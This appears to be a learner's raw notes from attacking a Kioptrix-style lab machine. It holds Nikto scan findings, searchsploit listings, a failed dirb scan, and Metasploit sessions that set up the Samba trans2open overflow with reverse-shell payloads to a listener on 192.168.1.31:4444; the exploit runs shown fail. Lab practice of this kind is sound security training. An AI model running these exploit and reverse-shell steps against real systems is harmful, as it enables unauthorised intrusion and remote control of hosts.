++ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
++ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
++ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
++ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
++ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
++ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
++ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
++ /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835
++ /manual/: Directory indexing found.
++ /manual/: Web server manual found.
++ /icons/: Directory indexing found.
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ /test.php: This might be interesting.
++ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
++ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
++ /shell?cat+/etc/hosts: A backdoor was identified.
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ 8916 requests: 8 error(s) and 30 item(s) reported on remote host
++ End Time:           2023-12-17 00:07:25 (GMT0) (186 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+Metasploit i trans2open:
+
+metasploit
+
+set RHOSTS 192.168.1.104
+set LHOST 192.168.1.31
+use trans2open
+use 0
+run
+use 1
+run
+
+
+msf6 > use trans2open
+
+Matching Modules
+================
+
+   #  Name                              Disclosure Date  Rank   Check  Description
+   -  ----                              ---------------  ----   -----  -----------
+   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
+   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
+   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
+   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open
+
+msf6 > ls
+[*] exec: ls
+
+192.168.1.104  Documents  Kioptrixlvl1.xml  Pictures  Templates  exploit  legion       zad1        zad1.nmap
+Desktop        Downloads  Music             Public    Videos     file     paused.conf  zad1.nikto
+msf6 > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf6 > set LHOST 192.168.1.31
+LHOST => 192.168.1.31
+msf6 > run 0
+[-] Unknown command: run
+msf6 > use 0
+[*] No payload configured, defaulting to bsd/x86/shell/reverse_tcp
+msf6 exploit(freebsd/samba/trans2open) > run
+
+[-] Handler failed to bind to 192.168.1.31:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] 192.168.1.104:139 - Trying return address 0xbfbffdfc...
+[-] 192.168.1.104:139 - The host (192.168.1.104:139) was unreachable.
+[*] 192.168.1.104:139 - Trying return address 0xbfbffcfc...
+[-] 192.168.1.104:139 - The host (192.168.1.104:139) was unreachable.
+
+
+msf6 exploit(windows/smb/group_policy_startup) > jobs
+
+Jobs
+====
+
+  Id  Name                                       Payload                          Payload opts
+  --  ----                                       -------                          ------------
+  0   Exploit: windows/smb/group_policy_startup  windows/meterpreter/reverse_tcp  tcp://192.168.1.31:4444
+
+
+
+
+
+
+v 3
+
+przeszukanie katalogów
+Dirb
+─$ dirb https://192.168.1.104
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Dec 17 00:29:51 2023
+URL_BASE: https://192.168.1.104/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: https://192.168.1.104/ ----
+                                                                               
+(!) FATAL: Too many errors connecting to host
+    (Possible cause: COULDNT CONNECT)
+                                                                               
+-----------------
+END_TIME: Sun Dec 17 00:29:51 2023
+DOWNLOADED: 0 - FOUND: 0
+
+
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+[*] Starting persistent handler(s)...
+msf6 > use auxiliary/scanner/smb/smb_version 
+msf6 auxiliary(scanner/smb/smb_version) > options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   THREADS  1                yes       The number of concurrent threads (max one per host)                                                         
+                                                                                                                                                   
+                                                                                                                                                   
+View the full module info with the info, or info -d command.                                                                                       
+
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf6 auxiliary(scanner/smb/smb_version) > run
+
+[*] 192.168.1.104:        - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_version) > 
+
+
+
+searchsploit samba 2.2
+
+
+└─$ searchsploit samba 2.2
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                      |  Path
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 2.0.x/2.2 - Arbitrary File Creation                                                                           | unix/remote/20968.txt
+Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                        | osx/remote/9924.rb
+Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                             | linux/remote/16321.rb
+Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                   | bsd_x86/remote/16880.rb
+Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                     | linux/local/23674.txt
+Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                 | linux_x86/remote/16861.rb
+Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                   | osx_ppc/remote/16876.rb
+Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                             | solaris_sparc/remote/16330.rb
+Samba 2.2.8 - Brute Force Method Remote Command Execution                                                           | linux/remote/55.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                          | unix/remote/22468.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                          | unix/remote/22469.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                          | unix/remote/22470.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                          | unix/remote/22471.txt
+Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                | linux/remote/9936.rb
+Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                             | unix/remote/22356.c
+Samba 2.2.x - Remote Buffer Overflow                                                                                | linux/remote/7.pl
+Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                   | multiple/remote/10.c
+Samba < 3.0.20 - Remote Heap Overflow                                                                               | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                       | linux_x86/dos/36741.py
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+[*] Starting persistent handler(s)...
+msf6 > searchsploit trans2open
+[*] exec: searchsploit trans2open
+
+------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                     |  Path
+------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                       | osx/remote/9924.rb
+Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                  | bsd_x86/remote/16880.rb
+Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                | linux_x86/remote/16861.rb
+Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                  | osx_ppc/remote/16876.rb
+Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                            | solaris_sparc/remote/16330.rb
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                         | unix/remote/22468.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                         | unix/remote/22469.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                         | unix/remote/22470.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                         | unix/remote/22471.txt
+------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+msf6 > search trans2open
+
+Matching Modules
+================
+
+   #  Name                              Disclosure Date  Rank   Check  Description
+   -  ----                              ---------------  ----   -----  -----------
+   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
+   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
+   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
+   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open
+
+msf6 > 
+
+
+
+9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+[*] Starting persistent handler(s)...
+msf6 > searchsploit trans2open
+[*] exec: searchsploit trans2open
+
+------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                     |  Path
+------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                       | osx/remote/9924.rb
+Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                  | bsd_x86/remote/16880.rb
+Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                | linux_x86/remote/16861.rb
+Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                  | osx_ppc/remote/16876.rb
+Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                            | solaris_sparc/remote/16330.rb
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                         | unix/remote/22468.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                         | unix/remote/22469.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                         | unix/remote/22470.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                         | unix/remote/22471.txt
+------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+msf6 > search trans2open
+
+Matching Modules
+================
+
+   #  Name                              Disclosure Date  Rank   Check  Description
+   -  ----                              ---------------  ----   -----  -----------
+   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
+   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
+   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
+   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open
+
+msf6 > Interrupt: use the 'exit' command to quit
+msf6 > use 1
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf6 exploit(linux/samba/trans2open) > options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.31     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(linux/samba/trans2open) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf6 exploit(linux/samba/trans2open) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                              Disclosure Date  Rank    Check  Description
+   -   ----                                              ---------------  ----    -----  -----------
+   0   payload/generic/custom                                             normal  No     Custom Payload
+   1   payload/generic/debug_trap                                         normal  No     Generic x86 Debug Trap
+   2   payload/generic/shell_bind_aws_ssm                                 normal  No     Command Shell, Bind SSM (via AWS API)
+   3   payload/generic/shell_bind_tcp                                     normal  No     Generic Command Shell, Bind TCP Inline
+   4   payload/generic/shell_reverse_tcp                                  normal  No     Generic Command Shell, Reverse TCP Inline
+   5   payload/generic/ssh/interact                                       normal  No     Interact with Established SSH Connection
+   6   payload/generic/tight_loop                                         normal  No     Generic x86 Tight Loop
+   7   payload/linux/x86/adduser                                          normal  No     Linux Add User
+   8   payload/linux/x86/chmod                                            normal  No     Linux Chmod
+   9   payload/linux/x86/exec                                             normal  No     Linux Execute Command
+   10  payload/linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)
+   11  payload/linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support (Linux x86)
+   12  payload/linux/x86/meterpreter/bind_nonx_tcp                        normal  No     Linux Mettle x86, Bind TCP Stager
+   13  payload/linux/x86/meterpreter/bind_tcp                             normal  No     Linux Mettle x86, Bind TCP Stager (Linux x86)
+   14  payload/linux/x86/meterpreter/bind_tcp_uuid                        normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support (Linux x86)
+   15  payload/linux/x86/meterpreter/reverse_ipv6_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager (IPv6)
+   16  payload/linux/x86/meterpreter/reverse_nonx_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager
+   17  payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
+   18  payload/linux/x86/meterpreter/reverse_tcp_uuid                     normal  No     Linux Mettle x86, Reverse TCP Stager
+   19  payload/linux/x86/metsvc_bind_tcp                                  normal  No     Linux Meterpreter Service, Bind TCP
+   20  payload/linux/x86/metsvc_reverse_tcp                               normal  No     Linux Meterpreter Service, Reverse TCP Inline
+   21  payload/linux/x86/read_file                                        normal  No     Linux Read File
+   22  payload/linux/x86/shell/bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind IPv6 TCP Stager (Linux x86)
+   23  payload/linux/x86/shell/bind_ipv6_tcp_uuid                         normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support (Linux x86)
+   24  payload/linux/x86/shell/bind_nonx_tcp                              normal  No     Linux Command Shell, Bind TCP Stager
+   25  payload/linux/x86/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager (Linux x86)
+   26  payload/linux/x86/shell/bind_tcp_uuid                              normal  No     Linux Command Shell, Bind TCP Stager with UUID Support (Linux x86)
+   27  payload/linux/x86/shell/reverse_ipv6_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager (IPv6)
+   28  payload/linux/x86/shell/reverse_nonx_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager
+   29  payload/linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
+   30  payload/linux/x86/shell/reverse_tcp_uuid                           normal  No     Linux Command Shell, Reverse TCP Stager
+   31  payload/linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline (IPv6)
+   32  payload/linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
+   33  payload/linux/x86/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
+   34  payload/linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
+   35  payload/linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)
+
+msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
+payload => linux/x86/shell_reverse_tcp
+msf6 exploit(linux/samba/trans2open) > options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.1.104    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (linux/x86/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   CMD    /bin/sh          yes       The command string to execute
+   LHOST  192.168.1.31     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(linux/samba/trans2open) > run
+
+[*] Started reverse TCP handler on 192.168.1.31:4444 
+[*] 192.168.1.104:139 - Trying return address 0xbffffdfc...
+[-] 192.168.1.104:139 - 192.168.1.104 The host (192.168.1.104:139) was unreachable.
+[*] 192.168.1.104:139 - Trying return address 0xbffffcfc...
+[-] 192.168.1.104:139 - 192.168.1.104 The host (192.168.1.104:139) was unreachable.
+[*] 192.168.1.104:139 - Trying return address 0xbffffbfc...
+[-] 192.168.1.104:139 - 192.168.1.104 The host (192.168.1.104:139) was unreachable.
+[*] 192.168.1.104:139 - Trying return address 0xbffffafc...
+[-] 192.168.1.104:139 - 192.168.1.104 The host (192.168.1.104:139) was unreachable.
+[*] 192.168.1.104:139 - Trying return address 0xbffff9fc...
+[-] 192.168.1.104:139 - 192.168.1.104 The host (192.168.1.104:139) was unreachable.
+[*] 192.168.1.104:139 - Trying return address 0xbffff8fc...
+[-] 192.168.1.104:139 - 192.168.1.104 The host (192.168.1.104:139) was unreachable.
+[*] 192.168.1.104:139 - Trying return address 0xbffff7fc...
+[-] 192.168.1.104:139 - 192.168.1.104 The host (192.168.1.104:139) was unreachable.
+[*] 192.168.1.104:139 - Trying return address 0xbffff6fc...
+[-] 192.168.1.104:139 - 192.168.1.104 The host (192.168.1.104:139) was unreachable.
+[*] 192.168.1.104:139 - Trying return address 0xbffff5fc...
+[-] 192.168.1.104:139 - 192.168.1.104 The host (192.168.1.104:139) was unreachable.
+[*] 192.168.1.104:139 - Trying return address 0xbffff4fc...
+[-] 192.168.1.104:139 - 192.168.1.104 The host (192.168.1.104:139) was unreachable.
+^C[-] 192.168.1.104:139 - Exploit failed [user-interrupt]: Interrupt 
+[-] run: Interrupted
+msf6 exploit(linux/samba/trans2open) > options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.1.104    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (linux/x86/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   CMD    /bin/sh          yes       The command string to execute
+   LHOST  192.168.1.31     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+
+
+View the full module info with the info, or info -d command.
+
